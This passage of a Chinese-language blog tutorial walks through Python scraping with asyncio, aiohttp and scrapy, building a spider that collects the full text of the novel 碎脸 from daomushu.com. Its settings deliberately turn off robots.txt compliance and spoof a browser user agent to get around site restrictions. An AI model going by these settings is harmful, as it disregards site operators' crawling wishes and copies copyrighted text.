<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多任务异步协程</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#调用这个async修饰的函数就会返回一个协程对象</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;正在下载&#x27;</span>,url)</span><br><span class="line">    <span class="comment">#在异步协程中如果出现了同步模块相关的代码，那么就无法实现异步</span></span><br><span class="line">    <span class="comment">#time.sleep(2)</span></span><br><span class="line">    <span class="comment">#当在asyncio中遇到阻塞操作必须进行手动挂起</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载完毕&#x27;</span>,url)</span><br><span class="line">start = time.time()</span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">&#x27;www.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;www.sogou.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;www.goubanjia.com&#x27;</span></span><br><span class="line">]</span><br><span class="line"><span class="comment">#任务列表，存放多个任务对象</span></span><br><span class="line">stasks = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    c = request(url)</span><br><span class="line">    <span class="comment">#将协程对象封装到任务对象当中</span></span><br><span class="line">    task = asyncio.ensure_future(c)</span><br><span class="line">    stasks.append(task)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(stasks))<span class="comment">#必须要把这个列表封装到wait方法中，固定写法</span></span><br><span class="line"><span class="built_in">print</span>(time.time()-start)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-2-3aiohttp模块"><a href="#3-2-3aiohttp模块" class="headerlink" title="3.2.3aiohttp模块"></a>3.2.3aiohttp模块</h3><p>注意request模块是同步的，在异步协程中就不能使用request模块了，我们要使用基于异步的网络请求模块。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="comment">#使用该模块中的ClientSession对象</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">    <span class="comment">#get()/post()</span></span><br><span class="line">    <span class="comment">#headers,params/data,proxy = &#x27;http://ip:port&#x27;</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span>  <span class="keyword">await</span> session.get(url) <span class="keyword">as</span> response:<span class="comment">#阻塞操作必须使用await关键字手动挂起</span></span><br><span class="line">        page_text = <span class="keyword">await</span> response.text()<span class="comment">#text方法可以返回字符串形式的响应数据,这里获取响应数据操作之前也必须使用await进行手动挂起</span></span><br><span class="line">        <span class="comment">#read()方法返回的是二进制形式的响应数据</span></span><br><span class="line">        <span class="comment">#json()方法返回的就是json对象</span></span><br><span class="line">        <span class="built_in">print</span>(page_text)</span><br></pre></td></tr></table></figure>

<h1 id="4-selenium模块"><a href="#4-selenium模块" class="headerlink" title="4.selenium模块"></a>4.selenium模块</h1><h2 id="4-1主要作用"><a href="#4-1主要作用" class="headerlink" title="4.1主要作用"></a>4.1主要作用</h2><p>selenium模块可以很便捷的获取网站中动态加载的数据。</p>
<p>selenium也可以十分便捷的实现模拟登陆</p>
<p><code>什么是selenium？</code></p>
<p>基于浏览器自动化的一个模块。</p>
<h2 id="4-2selenium初试"><a href="#4-2selenium初试" class="headerlink" title="4.2selenium初试"></a>4.2selenium初试</h2><p>使用这个模块，还需要一个浏览器的驱动程序</p>
<p><a href="https://zhuanlan.zhihu.com/p/61312218">Selenium3 + Python3：安装selenium浏览器驱动 - 知乎 (zhihu.com)</a></p>
<h2 id="4-3常用方法"><a href="#4-3常用方法" class="headerlink" title="4.3常用方法"></a>4.3常用方法</h2><p><a href="https://www.cnblogs.com/linhaifeng/articles/7783599.html">selenium模块 - linhaifeng - 博客园 (cnblogs.com)</a></p>
<p>我不怎么用就偷下懒啦(<em>^▽^</em>)</p>
<h1 id="5-scrapy框架"><a href="#5-scrapy框架" class="headerlink" title="5.scrapy框架"></a>5.scrapy框架</h1><p><code>什么是框架？</code></p>
<p>就是一个集成了很多功能并且具有很强通用性的一个项目模板。</p>
<p><code>如何学习框架？</code></p>
<p>专门学习框架封装的各种功能的详细用法。</p>
<h2 id="5-1环境安装"><a href="#5-1环境安装" class="headerlink" title="5.1环境安装"></a>5.1环境安装</h2><p>windows：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install wheel</span><br><span class="line">下载twisted,下载地址为http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</span><br><span class="line">安装twisted,pip install Twisted-17.1.0-cp36-cp36m-win_amd64.whl</span><br><span class="line">pip install pywin32</span><br><span class="line">pip install scrapy</span><br><span class="line">测试：在终端输入scrapy指令，没有报错即表示安装成功！</span><br></pre></td></tr></table></figure>

<h2 id="5-2基本使用"><a href="#5-2基本使用" class="headerlink" title="5.2基本使用"></a>5.2基本使用</h2><p>创建一个工程:用terminal</p>
<p>scrapy startproject xxx</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126224001577.png" alt="image-20220126224001577"></p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126224048649.png" alt="image-20220126224048649"></p>
<p>下面的scrapy.cfg文件就是他的配置文件，里面的spider文件夹我们一般称为爬虫文件夹。</p>
<p>在spider字母里中创建一个爬虫文件</p>
<p>·scrapy genspider spiderName <a href="http://www.xxx.com/">www.xxx.com</a></p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126232130118.png" alt="image-20220126232130118"></p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126232222195.png" alt="image-20220126232222195"></p>
<p>分析一下创建的爬虫文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpidernameSpider</span>(<span class="params">scrapy.Spider</span>):</span><span class="comment">#他的父类是spider</span></span><br><span class="line">    <span class="comment">#爬虫文件的名称：就是爬虫源文件的一个唯一标识，不能重复</span></span><br><span class="line">    name = <span class="string">&#x27;spiderName&#x27;</span></span><br><span class="line">    <span class="comment">#允许的域名：用来限定start urls列表中那些url可以进行请求发送，但是我们通常情况下我们不会使用这个限制。</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;www.baidu.com&#x27;</span>]</span><br><span class="line">    <span class="comment">#起始的url列表：该列表中存放的url会被scrapy自动进行请求的发送</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.baidu.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#用作于数据解析，response参数表示的就是请求成功后对应的响应对象，parse调用一次只会接受一个调用response</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(response)<span class="comment">#这个是后面我自己加的，实验用的</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>执行工程</p>
<p>scrapy crawl spiderName</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126233751717.png" alt="image-20220126233751717"></p>
<p>执行上述爬虫文件之后会出现一堆日志，但是没有输出response。</p>
<p>重要输出</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126235312766.png" alt="image-20220126235312766"></p>
<p>也就是我们尊从了robots协议的，也就是其他的东西我们就爬不到了，先给他改成false。</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126235358881.png" alt="image-20220126235358881"></p>
<p>但是那么多日志信息打扰了我们的查询，我们用–nolog参数可以消除参数</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220126235720349.png" alt="image-20220126235720349"></p>
<p>但是如果一味的使用nolog的话，我们反而有些时候看不到报错的信息，那该怎么办呢</p>
<p>在setting中加一行 LOG_LEVEL = ‘ERROR’</p>
<p>让我们输出指定类型的日志信息，这样我们就只看得到报错的日志了。</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127000226816.png" alt="image-20220127000226816"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建一个工程:用terminal</span><br><span class="line">scrapy startproject xxx</span><br><span class="line"></span><br><span class="line">在spider字母里中创建一个爬虫文件</span><br><span class="line">·scrapy genspider spiderName www.xxx.com</span><br><span class="line"></span><br><span class="line">执行工程</span><br><span class="line">scrapy crawl spiderName</span><br><span class="line"></span><br><span class="line">LOG_LEVEL = &#x27;ERROR&#x27;</span><br><span class="line">setting里面也有ua伪装</span><br><span class="line"></span><br><span class="line">想要拿到selector里面的data值，就用.extract()对象</span><br><span class="line">如果列表调用了extract，则表示将每一个selector对象中data对应的字符串提取了出来。</span><br></pre></td></tr></table></figure>

<h2 id="5-3数据解析"><a href="#5-3数据解析" class="headerlink" title="5.3数据解析"></a>5.3数据解析</h2><p>下面用一个实例来介绍一下数据解析，爬取一下《碎脸》</p>
<p><a href="http://www.daomushu.com/suilian/">碎脸小说(鬼古女)_碎脸全文免费阅读_盗墓小说网 (daomushu.com)</a></p>
<p>首先创建创建一个工程，</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127114024171.png" alt="image-20220127114024171"></p>
<p>然后我们就可以用parse方法进行数据解析就可以了</p>
<p>在这个框架中，我们直接在response.xpth()进行数据解析。返回的是一个列表，里面的元素是selector对象，想要拿到里面的data值，就用.extract()对象</p>
<p>那就简单了啊！开始解析！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;suilian&#x27;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.daomushu.com/suilian/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        url_list = response.xpath(<span class="string">&#x27;//ul/li[@class = &quot;line3&quot;]/a/@href&#x27;</span>)</span><br><span class="line">        new_url = url_list.extract()</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>这样就把所有的url解析出来了，但是我还没有学到用scrapy再次利用url，不可能在这里面再次用一下request模块，就先把这个url给爬下来就可。</p>
<h2 id="5-4数据持久化存储"><a href="#5-4数据持久化存储" class="headerlink" title="5.4数据持久化存储"></a>5.4数据持久化存储</h2><h3 id="5-4-1基于终端指令"><a href="#5-4-1基于终端指令" class="headerlink" title="5.4.1基于终端指令"></a>5.4.1基于终端指令</h3><p>要求只可以将parse方法的返回值存储到本地的文本文件中。</p>
<p><code>scrapy crawl xxx -o ./xxx.csv</code>#在执行的时候-o就可以把parse的返回值存储到当前文件夹下面的xxx.csv中。只支持这些文件类型</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127121921265.png" alt="image-20220127121921265"></p>
<h3 id="5-4-2基于管道（重点）"><a href="#5-4-2基于管道（重点）" class="headerlink" title="5.4.2基于管道（重点）"></a>5.4.2基于管道（重点）</h3><p>编码流程：</p>
<p>1.数据解析</p>
<p>2.在item类中定义相关的属性</p>
<p>3.将解析的数据封装到item类型的对象中</p>
<p>4.将item类型的对象提交给管道进行持久化存储的操作</p>
<p>5.在配置文件中开启管道</p>
<p>在创建的工程中，有一个items文件，在里面给我们定义了一个类</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127122345118.png" alt="image-20220127122345118"></p>
<p>但是并没有定义属性，我们就可以用<code>name = scrapy.Field()</code>来定义我们的属性。</p>
<p>同样也有一个pipelines文件，里面有个类，就是专门用来处理（持久化存储）item对象的。</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127140410577.png" alt="image-20220127140410577"></p>
<p>里面的方法可以接受爬虫文件提交过来的item对象</p>
<p>下面我演示一下处理刚刚得到的碎脸小说url。</p>
<h4 id="5-4-2-1实例"><a href="#5-4-2-1实例" class="headerlink" title="5.4.2.1实例"></a>5.4.2.1实例</h4><p>首先解析到数据</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127140852085.png" alt="image-20220127140852085"></p>
<p>然后在item类中定义相关属性</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127140943953.png" alt="image-20220127140943953"></p>
<p>将解析的数据封装到item类型的对象中（记得导入item类）</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127141502235.png" alt="image-20220127141502235"></p>
<p>将item类型的对象提交给管道，其中processitem方法，只要接收到一个item就会被调用一次</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127141355498.png" alt="image-20220127141355498"></p>
<p>在管道文件中进行持久化操作</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127142717471.png" alt="image-20220127142717471"></p>
<p>在设置中开启管道的注释</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127142335945.png" alt="image-20220127142335945"></p>
<p>三百表示优先级，数值越小优先级越高</p>
<p>最后运行，发现数据以及存储成功</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127142737442.png" alt="image-20220127142737442"></p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127142743267.png" alt="image-20220127142743267"></p>
<h3 id="5-2-3面试题，要把一份数据存到本地一份存到数据库"><a href="#5-2-3面试题，要把一份数据存到本地一份存到数据库" class="headerlink" title="5.2.3面试题，要把一份数据存到本地一份存到数据库"></a>5.2.3面试题，要把一份数据存到本地一份存到数据库</h3><p>那我们可以在管道类中多定义一份类，把他存放到数据库中。</p>
<p>setting中谁的优先级最高谁先接受item，为了保证后面执行的管道类也能够拿到item，在process_Item中也得return一个item。    </p>
<h2 id="5-3全站数据爬取"><a href="#5-3全站数据爬取" class="headerlink" title="5.3全站数据爬取"></a>5.3全站数据爬取</h2><p>就是将网站中某板块下的全部页码对应的页面数据进行爬取。</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127153344429.png" alt="image-20220127153344429"></p>
<p>这样会将所有页面中的xpath表达式表示的数据进行爬爬取。</p>
<h2 id="5-4五大核心组件"><a href="#5-4五大核心组件" class="headerlink" title="5.4五大核心组件"></a>5.4五大核心组件</h2><p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127163002697.png" alt="image-20220127163002697"></p>
<h2 id="5-5请求传参（深度爬取）"><a href="#5-5请求传参（深度爬取）" class="headerlink" title="5.5请求传参（深度爬取）"></a>5.5请求传参（深度爬取）</h2><p>使用场景：如果爬取解析的数据不再同一张页面中</p>
<p>要使用深度爬取就要用</p>
<p><code>yield scrapy.Reuests(xxx,callback=self.zidingyifangfa)</code></p>
<p>为什么不直接用xpath解析呢？因为在首页我们就已经使用了xpath了，为了防止起冲突，我们要额外定义一个方法来实现详情页的数据解析。</p>
<p>那么现在我们就来完善我们的碎脸爬虫</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127165322367.png" alt="image-20220127165322367"></p>
<p>首先我们迭代列表，然后自己写了个方法获取到了小说文本，现在只需要把他们弄到管道存起来就好了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> SUILIAN.items <span class="keyword">import</span> SuilianItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;suilian&#x27;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.daomushu.com/suilian/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_txt</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        content = response.xpath(<span class="string">&#x27;//div[@id=&quot;content&quot;]//text()&#x27;</span>).extract()</span><br><span class="line">        content = <span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(content)</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        url_list = response.xpath(<span class="string">&#x27;//ul/li[@class = &quot;line3&quot;]/a/@href&#x27;</span>)</span><br><span class="line">        new_url = url_list.extract()</span><br><span class="line">        <span class="keyword">for</span> iurl <span class="keyword">in</span> new_url:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(iurl,callback=self.parse_txt)</span><br></pre></td></tr></table></figure>

<p>item文件中定义一个新的属性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    content_url = scrapy.Field()</span><br><span class="line">    content = scrapy.Field()<span class="comment">#新定义的属性</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220127170831634.png" alt="image-20220127170831634"></p>
<p>在爬虫文件中把内容传入到item类中去,并且给属性赋值，然后将数据提交给管道。</p>
<p>随后我们就爬取到了碎脸小说</p>
<p>下面放一下各个文件的源码</p>
<p>suilian.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> SUILIAN.items <span class="keyword">import</span> SuilianItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuilianSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;suilian&#x27;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;http://www.daomushu.com/suilian/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_txt</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        content = response.xpath(<span class="string">&#x27;//div[@id=&quot;content&quot;]//text()&#x27;</span>).extract()</span><br><span class="line">        content = <span class="string">&#x27;&lt;br&gt;&#x27;</span>.join(content)</span><br><span class="line">        item = SuilianItem()</span><br><span class="line">        item[<span class="string">&#x27;content&#x27;</span>] = content</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        url_list = response.xpath(<span class="string">&#x27;//ul/li[@class = &quot;line3&quot;]/a/@href&#x27;</span>)</span><br><span class="line">        new_url = url_list.extract()</span><br><span class="line">        <span class="keyword">for</span> iurl <span class="keyword">in</span> new_url:</span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(iurl,callback=self.parse_txt)</span><br></pre></td></tr></table></figure>

<p>setting</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Scrapy settings for SUILIAN project</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For simplicity, this file contains only settings considered important or</span></span><br><span class="line"><span class="comment"># commonly used. You can find more settings consulting the documentation:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/settings.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#     https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"></span><br><span class="line">BOT_NAME = <span class="string">&#x27;SUILIAN&#x27;</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;SUILIAN.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;SUILIAN.spiders&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure maximum concurrent requests performed by Scrapy (default: 16)</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS = 32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure a delay for requests for the same website (default: 0)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/settings.html#download-delay</span></span><br><span class="line"><span class="comment"># See also autothrottle settings and docs</span></span><br><span class="line"><span class="comment">#DOWNLOAD_DELAY = 3</span></span><br><span class="line"><span class="comment"># The download delay setting will honor only one of:</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_DOMAIN = 16</span></span><br><span class="line"><span class="comment">#CONCURRENT_REQUESTS_PER_IP = 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable cookies (enabled by default)</span></span><br><span class="line"><span class="comment">#COOKIES_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable Telnet Console (enabled by default)</span></span><br><span class="line"><span class="comment">#TELNETCONSOLE_ENABLED = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Override the default request headers:</span></span><br><span class="line"><span class="comment">#DEFAULT_REQUEST_HEADERS = &#123;</span></span><br><span class="line"><span class="comment">#   &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,</span></span><br><span class="line"><span class="comment">#   &#x27;Accept-Language&#x27;: &#x27;en&#x27;,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable spider middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/spider-middleware.html</span></span><br><span class="line"><span class="comment">#SPIDER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;SUILIAN.middlewares.SuilianSpiderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable downloader middlewares</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html</span></span><br><span class="line"><span class="comment">#DOWNLOADER_MIDDLEWARES = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;SUILIAN.middlewares.SuilianDownloaderMiddleware&#x27;: 543,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable or disable extensions</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/extensions.html</span></span><br><span class="line"><span class="comment">#EXTENSIONS = &#123;</span></span><br><span class="line"><span class="comment">#    &#x27;scrapy.extensions.telnet.TelnetConsole&#x27;: None,</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">&#x27;SUILIAN.pipelines.SuilianPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure the AutoThrottle extension (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/autothrottle.html</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_ENABLED = True</span></span><br><span class="line"><span class="comment"># The initial download delay</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_START_DELAY = 5</span></span><br><span class="line"><span class="comment"># The maximum download delay to be set in case of high latencies</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_MAX_DELAY = 60</span></span><br><span class="line"><span class="comment"># The average number of requests Scrapy should be sending in parallel to</span></span><br><span class="line"><span class="comment"># each remote server</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_TARGET_CONCURRENCY = 1.0</span></span><br><span class="line"><span class="comment"># Enable showing throttling stats for every response received:</span></span><br><span class="line"><span class="comment">#AUTOTHROTTLE_DEBUG = False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable and configure HTTP caching (disabled by default)</span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#httpcache-middleware-settings</span></span><br><span class="line"><span class="comment">#HTTPCACHE_ENABLED = True</span></span><br><span class="line"><span class="comment">#HTTPCACHE_EXPIRATION_SECS = 0</span></span><br><span class="line"><span class="comment">#HTTPCACHE_DIR = &#x27;httpcache&#x27;</span></span><br><span class="line"><span class="comment">#HTTPCACHE_IGNORE_HTTP_CODES = []</span></span><br><span class="line"><span class="comment">#HTTPCACHE_STORAGE = &#x27;scrapy.extensions.httpcache.FilesystemCacheStorage&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>pipelines</p>
